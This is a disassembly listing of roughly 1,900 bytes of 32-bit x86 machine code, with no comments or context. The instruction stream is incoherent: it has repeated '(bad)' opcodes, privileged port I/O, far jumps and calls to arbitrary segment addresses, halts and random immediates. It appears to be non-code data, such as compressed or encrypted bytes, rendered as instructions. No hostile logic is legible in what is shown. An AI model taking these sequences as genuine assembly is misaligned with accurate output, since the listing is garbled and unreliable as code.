  40dd08:	in     eax,dx
  40dd09:	std    
  40dd0a:	xchg   esp,eax
  40dd0b:	js     0x40dd61
  40dd0d:	push   esp
  40dd0e:	cdq    
  40dd0f:	mov    ebp,0xfee3a1e5
  40dd14:	ret    0xb097
  40dd17:	cmp    edx,eax
  40dd19:	(bad)  
  40dd1a:	sbb    al,0x5f
  40dd1c:	sub    esp,edi
  40dd1e:	jge    0x40dcfd
  40dd20:	push   cs
  40dd21:	not    DWORD PTR [ebx+0x68]
  40dd24:	enter  0xfe79,0x4d
  40dd28:	adc    BYTE PTR [edi+eiz*4-0x36],bh
  40dd2c:	pop    ebp
  40dd2d:	adc    ecx,DWORD PTR [edx+0x72]
  40dd30:	mov    bh,dh
  40dd32:	mov    al,0x7b
  40dd34:	cmp    eax,0xdb9b4529
  40dd39:	inc    edx
  40dd3a:	dec    edi
  40dd3b:	inc    edi
  40dd3c:	jb     0x40ddbc
  40dd3e:	lods   al,BYTE PTR ds:[esi]
  40dd3f:	xor    eax,ecx
  40dd41:	jbe    0x40dcec
  40dd43:	jmp    0xa9a6:0x43cff314
  40dd4a:	dec    eax
  40dd4b:	popa   
  40dd4c:	mul    DWORD PTR [esi]
  40dd4e:	js     0x40dd1d
  40dd50:	add    BYTE PTR ds:0x748ce007,ah
  40dd56:	out    dx,al
  40dd57:	outs   dx,BYTE PTR ds:[esi]
  40dd58:	data16 mov ch,0xb2
  40dd5b:	mov    ecx,0xd1ab189c
  40dd60:	add    al,0x8
  40dd62:	imul   ebx,DWORD PTR [edi+0x6f16ec57],0x7
  40dd69:	xchg   DWORD PTR [eax+eax*2],ebx
  40dd6c:	fadd   DWORD PTR [ebx]
  40dd6e:	out    dx,eax
  40dd6f:	add    BYTE PTR [eax],bl
  40dd71:	cmp    edi,DWORD PTR [ecx+0x31eff055]
  40dd77:	sbb    esi,edx
  40dd79:	and    al,0x9a
  40dd7b:	addr16 jno 0x40ddc5
  40dd7e:	popf   
  40dd7f:	inc    ecx
  40dd80:	cdq    
  40dd81:	test   ecx,0x54cbf7f3
  40dd87:	ja     0x40de08
  40dd89:	jmp    0x40dd51
  40dd8b:	es mov cl,0xc4
  40dd8e:	inc    eax
  40dd8f:	dec    eax
  40dd90:	jmp    0x40ddd0
  40dd92:	fst    DWORD PTR [ebx-0x5c4c15a8]
  40dd98:	xchg   ebx,eax
  40dd99:	dec    esp
  40dd9a:	xchg   ecx,eax
  40dd9b:	aad    0xb8
  40dd9d:	icebp  
  40dd9e:	fs scas eax,DWORD PTR es:[edi]
  40dda0:	out    dx,eax
  40dda1:	icebp  
  40dda2:	jl     0x40ddf1
  40dda4:	and    ah,bl
  40dda6:	ret    
  40dda7:	push   ds
  40dda8:	jo     0x40ddc4
  40ddaa:	stos   BYTE PTR es:[edi],al
  40ddab:	sbb    ecx,DWORD PTR [ebp-0x27]
  40ddae:	cld    
  40ddaf:	scas   eax,DWORD PTR es:[edi]
  40ddb0:	pop    edi
  40ddb1:	dec    ebx
  40ddb2:	push   ecx
  40ddb3:	cmp    eax,DWORD PTR [ecx]
  40ddb5:	jbe    0x40ddf0
  40ddb7:	test   ecx,ecx
  40ddb9:	mov    ebp,0x925fccb6
  40ddbe:	fucomp st(5)
  40ddc0:	lock fmul DWORD PTR [ecx]
  40ddc3:	mov    esi,edx
  40ddc5:	xchg   ebp,eax
  40ddc6:	test   al,0x83
  40ddc8:	xor    eax,edx
  40ddca:	jmp    0xb9eb:0x14d26868
  40ddd1:	test   al,0x67
  40ddd3:	or     DWORD PTR [ecx-0x7f0ca337],0x2a51d0e6
  40dddd:	bound  eax,QWORD PTR [esi+0x5f0e1f0a]
  40dde3:	lea    ebx,[ecx-0x724b04f9]
  40dde9:	ds sbb eax,0xea4e777f
  40ddef:	mov    cl,0xe1
  40ddf1:	imul   edx,DWORD PTR [ecx-0x1],0xffffff9b
  40ddf5:	ja     0x40de42
  40ddf7:	pusha  
  40ddf8:	imul   eax,DWORD PTR [edx-0xef1dbcc],0x32
  40ddff:	dec    edi
  40de00:	ins    BYTE PTR es:[edi],dx
  40de01:	jg     0x40de3c
  40de03:	dec    BYTE PTR [edx]
  40de05:	inc    edx
  40de06:	add    al,0x81
  40de08:	cmp    BYTE PTR [edx+esi*4-0x65],0xf9
  40de0d:	push   ss
  40de0e:	jbe    0x40de51
  40de10:	jmp    FWORD PTR [edi]
  40de12:	xor    bh,BYTE PTR [edi]
  40de14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de15:	shl    DWORD PTR [edx+0x34911aa9],cl
  40de1b:	test   eax,0x8a7638a9
  40de20:	repz aam 0xd1
  40de23:	push   edi
  40de24:	adc    BYTE PTR [ebx+0x18fe9ddf],ch
  40de2a:	loop   0x40ddc2
  40de2c:	rcl    DWORD PTR [edx+eiz*2-0x42],1
  40de30:	mov    dl,0x5a
  40de32:	mov    ebp,0x91d05c04
  40de37:	test   bl,0x71
  40de3a:	jnp    0x40de5e
  40de3c:	mov    esi,0xfc192af4
  40de41:	xor    eax,0xd374e873
  40de46:	jge    0x40de58
  40de48:	or     ch,dl
  40de4a:	call   0xdf9d:0xe4519f6e
  40de51:	push   esi
  40de52:	xor    al,0xc4
  40de54:	pop    ecx
  40de55:	and    eax,0xee0f2457
  40de5a:	sbb    al,0x55
  40de5c:	push   cs
  40de5d:	xor    eax,0x937c4311
  40de63:	pop    edx
  40de64:	push   ds
  40de65:	mov    ch,0x2c
  40de67:	jmp    0x40de2e
  40de69:	loop   0x40de25
  40de6b:	xchg   ebx,eax
  40de6c:	push   es
  40de6d:	rol    DWORD PTR ds:0x8db68d6b,0x9f
  40de74:	cmc    
  40de75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de76:	pop    ecx
  40de77:	or     eax,0xf2ffd773
  40de7c:	pop    edx
  40de7d:	repz add BYTE PTR [edi+ecx*4+0x35],dh
  40de82:	add    al,0x5c
  40de84:	pop    ebx
  40de85:	arpl   bx,ax
  40de87:	enter  0x1fd,0xde
  40de8b:	dec    ebp
  40de8c:	and    BYTE PTR [ecx],dh
  40de8e:	cmc    
  40de8f:	sub    BYTE PTR [esi+0xe],al
  40de92:	cli    
  40de93:	mov    ebp,DWORD PTR [eax-0x26]
  40de96:	jp     0x40dea3
  40de98:	in     al,0xf8
  40de9a:	popf   
  40de9b:	pop    ebx
  40de9c:	mov    edi,DWORD PTR [ebp-0x28]
  40de9f:	scas   al,BYTE PTR es:[edi]
  40dea0:	mov    esp,0x69b61be7
  40dea5:	dec    esi
  40dea6:	out    0xc8,al
  40dea8:	or     eax,0x570cb932
  40dead:	dec    eax
  40deae:	cs dec eax
  40deb0:	inc    ebp
  40deb1:	cwde   
  40deb2:	xchg   ebp,eax
  40deb3:	mov    ebx,0x6071d8b
  40deb8:	push   ss
  40deb9:	test   DWORD PTR [ebp+0x20],ebp
  40debc:	xor    bh,dl
  40debe:	test   al,0x67
  40dec0:	mov    bl,0xaa
  40dec2:	push   edi
  40dec3:	sub    al,0x10
  40dec5:	mov    dh,0x97
  40dec7:	jmp    0x40df29
  40dec9:	jmp    0x40de77
  40decb:	xor    ebx,ebx
  40decd:	xor    cl,dh
  40decf:	repz xor al,0xd9
  40ded2:	into   
  40ded3:	pushf  
  40ded4:	xchg   DWORD PTR [esi+0x1ea46b3a],ecx
  40deda:	push   edx
  40dedb:	mov    esp,0x4e3a61f3
  40dee0:	or     al,dh
  40dee2:	jp     0x40df41
  40dee4:	cmp    bh,BYTE PTR [ebx+ecx*1]
  40dee7:	inc    esi
  40dee8:	xchg   ebp,eax
  40dee9:	and    eax,0x5a02606f
  40deee:	ds xor al,0x51
  40def1:	pop    ss
  40def2:	cmc    
  40def3:	scas   eax,DWORD PTR es:[edi]
  40def4:	mov    eax,0xb2f6b731
  40def9:	fs scas al,BYTE PTR es:[edi]
  40defb:	sbb    esi,DWORD PTR [ecx-0x7cc34843]
  40df01:	lea    ecx,[edx-0x50]
  40df04:	sbb    edi,0x76
  40df07:	test   DWORD PTR [esi+0x3c],edi
  40df0a:	out    dx,al
  40df0b:	xchg   ebx,eax
  40df0c:	loopne 0x40deba
  40df0e:	xor    al,0x53
  40df10:	mov    BYTE PTR ds:0xf7a58ed7,cl
  40df16:	popf   
  40df17:	or     eax,0x4a0d08b2
  40df1c:	xor    ecx,eax
  40df1e:	icebp  
  40df1f:	inc    esp
  40df20:	jno    0x40df14
  40df22:	test   BYTE PTR ss:[edx],ah
  40df25:	stos   DWORD PTR es:[edi],eax
  40df26:	push   0xc0a38497
  40df2b:	and    al,0x69
  40df2d:	lds    ebp,FWORD PTR [ecx-0x433403c4]
  40df33:	out    0x9b,eax
  40df35:	jl     0x40df3e
  40df37:	or     DWORD PTR [ebp-0x2346df56],ecx
  40df3d:	cmp    DWORD PTR [ebx],eax
  40df3f:	(bad)  
  40df41:	lea    edi,[ebx]
  40df43:	sub    esi,0xfffffffe
  40df46:	dec    ecx
  40df47:	fwait
  40df48:	arpl   WORD PTR [esi],bp
  40df4a:	sar    BYTE PTR [edx-0x64d7900a],1
  40df50:	aas    
  40df51:	ret    0xdbb1
  40df54:	mov    al,ds:0xfd8bf6a0
  40df59:	xchg   ecx,eax
  40df5a:	or     eax,eax
  40df5c:	repz mov ebx,0x96109c62
  40df62:	or     bl,ch
  40df64:	fnstcw WORD PTR [ebp-0x58]
  40df67:	sub    al,0x8c
  40df69:	in     al,dx
  40df6a:	sar    BYTE PTR [ebx-0x2d],0xcf
  40df6e:	popa   
  40df6f:	or     al,0x32
  40df71:	jp     0x40df4e
  40df73:	dec    DWORD PTR [ebx-0x6b3b5bb8]
  40df79:	out    0x2d,eax
  40df7b:	imul   ecx,DWORD PTR [ecx+0x22be8414],0x77fe997a
  40df85:	and    DWORD PTR [ebx],edi
  40df87:	adc    al,0xe9
  40df89:	mov    ebp,0x7206b9ec
  40df8e:	mov    bl,0xfd
  40df90:	mov    es,WORD PTR [edi-0x9]
  40df93:	mov    BYTE PTR [edi-0x6f3dfaf8],0x76
  40df9a:	fwait
  40df9b:	mov    ch,0xe
  40df9d:	arpl   WORD PTR [ecx-0x4e70cd7d],di
  40dfa3:	pop    esp
  40dfa4:	test   BYTE PTR [edx+esi*2+0x1b],bh
  40dfa8:	addr16 je 0x40dfd2
  40dfab:	dec    DWORD PTR [edi]
  40dfad:	mov    al,0x2c
  40dfaf:	add    al,0xc8
  40dfb1:	icebp  
  40dfb2:	adc    al,0x61
  40dfb4:	or     ebp,DWORD PTR [edx-0x7e]
  40dfb7:	inc    ebx
  40dfb8:	adc    al,0x5f
  40dfba:	ss inc edi
  40dfbc:	rcl    BYTE PTR [edi],1
  40dfbe:	xchg   esp,eax
  40dfbf:	and    al,0xb9
  40dfc1:	push   edx
  40dfc2:	pop    ds
  40dfc3:	or     eax,0x1dbeeb61
  40dfc8:	inc    ebp
  40dfc9:	pop    dx
  40dfcb:	dec    esi
  40dfcc:	lds    ebx,FWORD PTR [edi+0x7b]
  40dfcf:	pop    es
  40dfd0:	dec    ebp
  40dfd1:	das    
  40dfd2:	mov    esi,0x67e4465
  40dfd7:	add    al,0x8e
  40dfd9:	or     eax,0xf4c226ae
  40dfde:	or     esi,0xed61045a
  40dfe4:	jmp    0x40dfcb
  40dfe6:	ror    edi,0xc2
  40dfe9:	mov    dl,BYTE PTR [ebp-0x525aefab]
  40dfef:	and    BYTE PTR [edx],0x9b
  40dff2:	inc    ebx
  40dff3:	out    0x9d,eax
  40dff5:	shr    esp,1
  40dff7:	mov    al,ds:0x50688d10
  40dffc:	into   
  40dffd:	push   esp
  40dffe:	mov    ds:0x61fd580b,eax
  40e003:	(bad)  
  40e004:	cmp    BYTE PTR ds:0x4e6163a6,dh
  40e00a:	mov    bh,0x4b
  40e00c:	dec    esp
  40e00d:	mov    bh,bl
  40e00f:	fsub   st,st(7)
  40e011:	mov    ebx,0x9167a57a
  40e016:	call   0xf157:0x24e875f6
  40e01d:	fistp  QWORD PTR [ecx+0x2a13f965]
  40e023:	fs mov ch,0x24
  40e026:	out    dx,eax
  40e027:	push   edx
  40e028:	push   cs
  40e029:	(bad)  
  40e02a:	xor    BYTE PTR [ebx+0x18b5a7e7],bh
  40e030:	stos   BYTE PTR es:[edi],al
  40e031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e032:	sub    ebx,ecx
  40e034:	ret    
  40e035:	hlt    
  40e036:	sub    eax,0xeb7ac991
  40e03b:	jns    0x40dfc0
  40e03d:	add    dh,BYTE PTR [edx+ebp*2]
  40e040:	shl    BYTE PTR [esi],1
  40e042:	mov    BYTE PTR [ecx],bh
  40e044:	add    DWORD PTR [esp+eax*8+0x61d59fa1],esp
  40e04b:	jg     0x40e00f
  40e04d:	mov    dl,BYTE PTR [ecx-0xc]
  40e050:	cmp    BYTE PTR [eax-0x5aea078d],bl
  40e056:	mov    ds:0xd271259c,eax
  40e05b:	add    dh,BYTE PTR [ebp-0x63da0f20]
  40e061:	imul   ebp,DWORD PTR [eax],0xd44a4686
  40e067:	jb     0x40e033
  40e069:	scas   eax,DWORD PTR es:[edi]
  40e06a:	int3   
  40e06b:	(bad)  
  40e06c:	pop    ecx
  40e06d:	sub    BYTE PTR [edi-0x6a863127],dh
  40e073:	lods   al,BYTE PTR ds:[esi]
  40e074:	add    edx,DWORD PTR [edx-0x13e6590b]
  40e07a:	hlt    
  40e07b:	sub    ah,BYTE PTR [ebp+0x55]
  40e07e:	fnstcw WORD PTR [ecx+esi*4]
  40e081:	sub    BYTE PTR [edi+0x4a47c6bd],dl
  40e087:	stos   BYTE PTR es:[edi],al
  40e088:	dec    edi
  40e089:	call   0xf07b:0x64b79bbb
  40e090:	lds    esi,FWORD PTR [edi-0x46]
  40e093:	sbb    eax,0x41812631
  40e098:	cwde   
  40e099:	fmulp  st(6),st
  40e09b:	pusha  
  40e09c:	aam    0x48
  40e09e:	pop    eax
  40e09f:	loopne 0x40e094
  40e0a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a2:	sub    eax,0xe6fd41aa
  40e0a7:	jmp    0xfd17:0xb30c42ac
  40e0ae:	push   edx
  40e0af:	lods   eax,DWORD PTR ds:[esi]
  40e0b0:	mov    edx,0x7c592881
  40e0b5:	sub    ch,BYTE PTR [esi+ebp*4]
  40e0b8:	scas   al,BYTE PTR es:[edi]
  40e0b9:	xor    dh,cl
  40e0bb:	push   0x744c9764
  40e0c0:	push   ebx
  40e0c1:	mov    dl,0xe5
  40e0c3:	pop    edi
  40e0c4:	mov    dh,0x81
  40e0c6:	arpl   WORD PTR [esi-0x6cde713d],ax
  40e0cc:	out    dx,al
  40e0cd:	or     al,BYTE PTR [eax-0x7c4449f6]
  40e0d3:	(bad)  
  40e0d4:	es out dx,eax
  40e0d6:	lahf   
  40e0d7:	popf   
  40e0d8:	adc    dl,0x64
  40e0db:	out    dx,al
  40e0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0dd:	inc    edi
  40e0de:	pusha  
  40e0df:	inc    ebx
  40e0e0:	adc    BYTE PTR [edi+0x4703b6],0x88
  40e0e7:	ror    DWORD PTR [eax-0x5d84c386],1
  40e0ed:	lods   eax,DWORD PTR ds:[esi]
  40e0ee:	push   ecx
  40e0ef:	hlt    
  40e0f0:	sahf   
  40e0f1:	int3   
  40e0f2:	inc    ecx
  40e0f3:	jnp    0x40e0ee
  40e0f5:	stc    
  40e0f6:	sub    BYTE PTR [eax],ch
  40e0f8:	inc    ebp
  40e0f9:	jg     0x40e0e7
  40e0fb:	mov    bl,0x1d
  40e0fd:	stc    
  40e0fe:	sub    ebx,0xffffffed
  40e101:	(bad)  
  40e102:	sub    esp,DWORD PTR [ebx+0x5b]
  40e105:	push   ebp
  40e106:	repz inc ebx
  40e108:	repz fidiv DWORD PTR [edx+0x731855a]
  40e10f:	mov    dl,0x5c
  40e111:	push   0xffffffa0
  40e113:	dec    esp
  40e114:	inc    esi
  40e115:	ja     0x40e149
  40e117:	clc    
  40e118:	and    al,0xc3
  40e11a:	cwde   
  40e11b:	adc    BYTE PTR [eax-0x3adae857],cl
  40e121:	pop    esp
  40e122:	(bad)  [eax-0x132bfa10]
  40e128:	adc    esp,eax
  40e12a:	xchg   ebx,eax
  40e12b:	in     al,0x2a
  40e12d:	ins    DWORD PTR es:[edi],dx
  40e12e:	jo     0x40e0e8
  40e130:	mov    ds:0xe57fd035,al
  40e135:	ds retf 0xb429
  40e139:	pop    esi
  40e13a:	rol    BYTE PTR [esi-0x58],1
  40e13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e13e:	cli    
  40e13f:	loope  0x40e106
  40e141:	dec    ecx
  40e142:	jp     0x40e1a0
  40e144:	jo     0x40e12a
  40e146:	xchg   esi,eax
  40e147:	in     eax,0xee
  40e149:	leave  
  40e14a:	adc    ch,BYTE PTR [edi]
  40e14c:	aad    0xc5
  40e14e:	jg     0x40e17f
  40e150:	hlt    
  40e151:	cmp    eax,0x1b22cf5f
  40e156:	retf   
  40e157:	mov    al,0x6f
  40e159:	mov    edi,0x67ad589c
  40e15e:	test   eax,0x39ccae15
  40e163:	ja     0x40e115
  40e165:	mov    ds:0x18ff0024,al
  40e16a:	lds    ecx,FWORD PTR [esi-0x7543042]
  40e170:	imul   edx,DWORD PTR [edi+0x3ff0a9cd],0x2ec1b321
  40e17a:	jbe    0x40e104
  40e17c:	push   0xffffffe8
  40e17e:	jo     0x40e144
  40e180:	adc    al,0xd
  40e182:	sar    DWORD PTR ds:[eax-0x6ee4b3d0],1
  40e189:	pusha  
  40e18a:	pop    edx
  40e18b:	jecxz  0x40e133
  40e18d:	lock pop ss
  40e18f:	push   eax
  40e190:	dec    edx
  40e191:	mov    edi,0x565a3c32
  40e196:	xchg   edi,eax
  40e197:	mov    esi,0x4adc8d20
  40e19c:	and    al,0x32
  40e19e:	ins    BYTE PTR es:[edi],dx
  40e19f:	out    dx,eax
  40e1a0:	add    DWORD PTR [edi-0x44],edx
  40e1a3:	mov    dl,0x2d
  40e1a5:	fwait
  40e1a6:	push   ebp
  40e1a7:	sbb    eax,0x7a468883
  40e1ac:	push   ebx
  40e1ad:	adc    esp,DWORD PTR [eax]
  40e1af:	jns    0x40e179
  40e1b1:	out    dx,eax
  40e1b2:	cwde   
  40e1b3:	cmp    ebx,DWORD PTR [eax]
  40e1b5:	dec    eax
  40e1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b7:	sub    bh,BYTE PTR [esi-0x7b]
  40e1ba:	lods   eax,DWORD PTR ds:[esi]
  40e1bb:	xor    al,cl
  40e1bd:	sub    BYTE PTR [ecx-0x61],0xa3
  40e1c1:	fwait
  40e1c2:	sub    DWORD PTR [ebx],0xe4a50469
  40e1c8:	and    ecx,DWORD PTR [eax-0x1b]
  40e1cb:	cmp    dh,BYTE PTR [ecx+0xd27ef06]
  40e1d1:	jbe    0x40e1b8
  40e1d3:	out    0x7a,eax
  40e1d5:	dec    eax
  40e1d6:	ret    0x633d
  40e1d9:	cdq    
  40e1da:	inc    ebp
  40e1db:	push   edx
  40e1dc:	jno    0x40e1f1
  40e1de:	adc    ah,BYTE PTR [eax]
  40e1e0:	in     al,dx
  40e1e1:	ds push ecx
  40e1e3:	mov    ebx,0x2d825c5e
  40e1e8:	xor    dl,BYTE PTR [ecx+ebp*8-0x22]
  40e1ec:	and    eax,DWORD PTR [ecx]
  40e1ee:	pushf  
  40e1ef:	mov    BYTE PTR [eax+0x2cd0f58b],0x56
  40e1f6:	pop    ss
  40e1f7:	(bad)  ds:0x95a61df7
  40e1fd:	pop    edx
  40e1fe:	bound  edx,QWORD PTR [edi-0x4b]
  40e201:	xor    ebx,DWORD PTR [edi]
  40e203:	pop    edx
  40e204:	jne    0x40e1d6
  40e206:	mov    ebp,0x7520cdc
  40e20b:	rcr    al,cl
  40e20d:	pushf  
  40e20e:	imul   DWORD PTR [ebx+edx*2-0x27a7feda]
  40e215:	jnp    0x40e1ed
  40e217:	mov    dh,0x31
  40e219:	fdivr  DWORD PTR [edi]
  40e21b:	pop    edx
  40e21c:	enter  0xa58d,0x81
  40e220:	sub    ah,BYTE PTR [edi]
  40e222:	adc    eax,0x84f135ac
  40e227:	nop
  40e228:	push   0xffffffcd
  40e22a:	mov    ecx,edi
  40e22c:	(bad)  
  40e22d:	mov    edi,0xe0b1d6a5
  40e232:	add    bl,BYTE PTR [edx+0x72bb902a]
  40e238:	adc    al,0x70
  40e23a:	push   es
  40e23b:	add    dh,ch
  40e23d:	inc    esi
  40e23e:	setg   BYTE PTR [ebx]
  40e241:	rcl    edi,0xef
  40e244:	sti    
  40e245:	lea    edx,[esi+0x2a3449ed]
  40e24b:	jmp    0x16ef1400
  40e250:	xchg   edx,eax
  40e251:	jmp    0x93a7439f
  40e256:	mov    esi,0xce4baf76
  40e25b:	pop    esi
  40e25c:	les    esp,FWORD PTR [ebx-0x48]
  40e25f:	adc    ebx,0x14
  40e262:	imul   esi,DWORD PTR [edx+0x4791df52],0xfffffff7
  40e269:	ins    BYTE PTR es:[edi],dx
  40e26a:	inc    esp
  40e26b:	xor    BYTE PTR [ecx],dl
  40e26d:	adc    al,0x9
  40e26f:	sbb    esi,DWORD PTR [eax+ecx*4+0x4ec0fd60]
  40e276:	int    0xf5
  40e278:	push   ebx
  40e279:	add    eax,0xc394458
  40e27e:	push   edi
  40e27f:	add    ecx,edi
  40e281:	sbb    eax,DWORD PTR [edx-0x12d90ee3]
  40e287:	mov    cl,0x8d
  40e289:	sub    eax,ebx
  40e28b:	add    al,0xe5
  40e28d:	shl    dl,1
  40e28f:	imul   ebx,DWORD PTR [esi+0x1a],0xffffff98
  40e293:	jmp    0x26d03317
  40e298:	xchg   ecx,eax
  40e299:	add    ebp,DWORD PTR [ecx]
  40e29b:	mov    bh,0x31
  40e29d:	mov    ah,0xa4
  40e29f:	fist   DWORD PTR [ebp+0x4ca701ee]
  40e2a5:	call   0x468a:0x1752b3d3
  40e2ac:	push   eax
  40e2ad:	pop    edx
  40e2ae:	test   eax,0x4b7aaef3
  40e2b3:	ret    
  40e2b4:	mov    ds:0x9c45e18f,eax
  40e2b9:	dec    edx
  40e2ba:	stos   DWORD PTR es:[edi],eax
  40e2bb:	xchg   ebx,eax
  40e2bc:	pop    ecx
  40e2bd:	rcl    BYTE PTR ds:0xe5ea96d0,1
  40e2c3:	and    al,0x33
  40e2c5:	sbb    al,BYTE PTR [ecx-0x1345f470]
  40e2cb:	sbb    BYTE PTR [eax-0x3d],dl
  40e2ce:	cli    
  40e2cf:	adc    al,0x83
  40e2d1:	xor    BYTE PTR [ebp+0x22c60bc7],bh
  40e2d7:	fiadd  WORD PTR [edi-0x432e5b1d]
  40e2dd:	xor    DWORD PTR [edx+0x9c343f0],0x27ccb0d8
  40e2e7:	fwait
  40e2e8:	jae    0x40e365
  40e2ea:	rcl    BYTE PTR cs:[eax+0x67],1
  40e2ee:	cdq    
  40e2ef:	mov    dl,0xf3
  40e2f1:	mov    ds:0x4ccd9774,eax
  40e2f6:	(bad)
  40e2f9:	pop    ecx
  40e2fa:	jge    0x40e299
  40e2fc:	jbe    0x40e32a
  40e2fe:	or     al,0x8
  40e300:	mov    al,0xc0
  40e302:	mov    al,ds:0x3a548d73
  40e307:	dec    edx
  40e308:	sar    BYTE PTR [edi-0x80],cl
  40e30b:	scas   al,BYTE PTR es:[edi]
  40e30c:	stc    
  40e30d:	fdivr  DWORD PTR [ebx-0x57dea28b]
  40e313:	ret    
  40e314:	dec    ebp
  40e315:	inc    eax
  40e316:	ror    BYTE PTR [ecx+0x5d549c7f],cl
  40e31c:	ret    
  40e31d:	and    eax,0x9a318cc9
  40e322:	test   ebx,edx
  40e324:	int    0xc9
  40e326:	jb     0x40e323
  40e328:	aas    
  40e329:	ret    
  40e32a:	push   ecx
  40e32b:	mov    eax,ebx
  40e32d:	adc    eax,0x59796a25
  40e332:	test   BYTE PTR [eax],0x6b
  40e335:	jbe    0x40e2c7
  40e337:	imul   edx,ecx,0xf88e6584
  40e33d:	stos   DWORD PTR es:[edi],eax
  40e33e:	in     eax,0x89
  40e340:	xchg   ecx,eax
  40e341:	xchg   BYTE PTR [edx+ebx*8+0x59],al
  40e345:	jge    0x40e356
  40e347:	fs dec ecx
  40e349:	inc    esp
  40e34a:	cli    
  40e34b:	dec    edx
  40e34c:	imul   esp,DWORD PTR [edi-0x3dbd86b4],0xfffffffb
  40e353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e354:	sbb    eax,esp
  40e356:	mov    ch,0xa
  40e358:	push   edi
  40e359:	mov    cl,0x65
  40e35b:	imul   esi,DWORD PTR [ebp+0xe],0xfffffffe
  40e35f:	or     al,0xd
  40e361:	and    DWORD PTR [edi],esp
  40e363:	mov    edi,0x9995cf19
  40e368:	xlat   BYTE PTR ds:[ebx]
  40e369:	sar    DWORD PTR [edi],0x4
  40e36c:	imul   edx,DWORD PTR [eax-0x27],0x4d723acc
  40e373:	retfw  
  40e375:	xchg   BYTE PTR [ebx-0x4461c6eb],cl
  40e37b:	bound  ebp,QWORD PTR [esi+0x32e3d22b]
  40e381:	dec    eax
  40e382:	mov    dh,0x78
  40e384:	hlt    
  40e385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e386:	pop    ds
  40e387:	or     BYTE PTR gs:[edi+0x55e281f7],0x84
  40e38f:	mov    ds:0x7d341609,eax
  40e394:	mov    bh,0x22
  40e396:	mov    eax,ds:0xb1eb14cb
  40e39b:	das    
  40e39c:	fcomp  st(0)
  40e39e:	fldenv [esi+0x557e29b0]
  40e3a4:	data16 sub bh,al
  40e3a7:	scas   al,BYTE PTR es:[edi]
  40e3a8:	daa    
  40e3a9:	adc    ah,bh
  40e3ab:	mov    dl,0xda
  40e3ad:	js     0x40e390
  40e3af:	xchg   dl,dl
  40e3b1:	xchg   edi,eax
  40e3b2:	arpl   WORD PTR [ebx-0x74],bx
  40e3b5:	rcr    DWORD PTR [ebx],1
  40e3b7:	popf   
  40e3b8:	or     edi,DWORD PTR [ebp-0x42]
  40e3bb:	sar    esp,0x81
  40e3be:	outs   dx,BYTE PTR ds:[esi]
  40e3bf:	xchg   esp,eax
  40e3c0:	cli    
  40e3c1:	out    dx,eax
  40e3c2:	int    0x29
  40e3c4:	in     eax,0xa4
  40e3c6:	pop    ds
  40e3c7:	addr16 add eax,0x65d165fd
  40e3cd:	into   
  40e3ce:	mov    ds:0xb325726d,al
  40e3d3:	scas   eax,DWORD PTR es:[edi]
  40e3d4:	or     bh,BYTE PTR [ebp+0x69]
  40e3d7:	xor    ecx,edi
  40e3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3da:	jbe    0x40e3f2
  40e3dc:	dec    esp
  40e3dd:	call   0x6f7b:0x1a15832c
  40e3e4:	adc    cl,BYTE PTR [ecx-0x48f5ac5f]
  40e3ea:	retf   
  40e3eb:	sbb    bl,BYTE PTR [eax+0x5e]
  40e3ee:	(bad)  
  40e3ef:	mov    eax,0x2b0444dd
  40e3f4:	jns    0x40e45a
  40e3f6:	push   ds
  40e3f7:	and    eax,0xd15cfeca
  40e3fc:	(bad)  
  40e3fd:	dec    edi
  40e3fe:	dec    edi
  40e3ff:	enter  0x18ec,0xf4
  40e403:	jecxz  0x40e427
  40e405:	and    edx,0xb25bb81f
  40e40b:	push   edx
  40e40c:	push   eax
  40e40d:	ins    DWORD PTR es:[edi],dx
  40e40e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e40f:	mov    al,0x25
  40e411:	es xchg edi,eax
  40e413:	adc    al,0x27
  40e415:	sbb    eax,0xaa874ec8
  40e41a:	mov    dl,0x75
  40e41c:	mov    dh,0xf1
  40e41e:	js     0x40e3ab
  40e420:	inc    edi
  40e421:	or     al,0xbe
  40e423:	mov    cl,0x14
  40e425:	(bad)  
  40e426:	xor    BYTE PTR [edx+0x6c6f4835],ah
  40e42c:	lods   eax,DWORD PTR ds:[esi]
  40e42d:	mov    eax,0x8d1db0d8
  40e432:	sti    
  40e433:	push   ds
  40e434:	mov    ds:0x6c3a8fd,al
  40e439:	adc    BYTE PTR [ebx],ah
  40e43b:	or     al,0x16
  40e43d:	into   
  40e43e:	cvtps2pi mm7,QWORD PTR [ebp-0xe]
  40e442:	int    0x29
  40e444:	call   0x52de:0xd430ed4d
  40e44b:	(bad)  
  40e44c:	das    
  40e44d:	xor    ch,ch
  40e44f:	xor    DWORD PTR [esi],esp
  40e451:	cmc    
  40e452:	leave  
  40e453:	or     al,0xe9
  40e455:	es ins DWORD PTR es:[di],dx
  40e458:	hlt    
  40e459:	cmp    al,0x4d
  40e45b:	cmp    ecx,DWORD PTR [eax]
  40e45d:	pop    esp
  40e45e:	pop    ebp
  40e45f:	imul   ebx,edi,0x3
  40e462:	push   ebp
  40e463:	sub    eax,0x3f5a4f7e
  40e468:	daa    
  40e469:	repnz inc ebx
  40e46b:	data16 xchg BYTE PTR [ebx-0x77],ch
  40e46f:	popf   
  40e470:	scas   eax,DWORD PTR es:[edi]
  40e471:	mov    WORD PTR [edx+ebp*4+0x7ef8d102],ds
  40e478:	add    ch,BYTE PTR [edi+0x23763707]
  40e47e:	pop    ecx
  40e47f:	bound  edx,QWORD PTR [esi]
  40e481:	cld    
  40e482:	adc    eax,0xfd63836d
  40e487:	mov    DWORD PTR [ebx+0x1b52bf48],edx
  40e48d:	paddusb mm7,QWORD PTR [ecx-0x14]
  40e491:	jmp    0x1fac:0x918eb5af
  40e498:	fwait
  40e499:	add    DWORD PTR [ecx],0x472917b9
  40e49f:	push   edx
  40e4a0:	into   
  40e4a1:	aaa    
  40e4a2:	adc    DWORD PTR [edx+0x25dc4f6e],esi
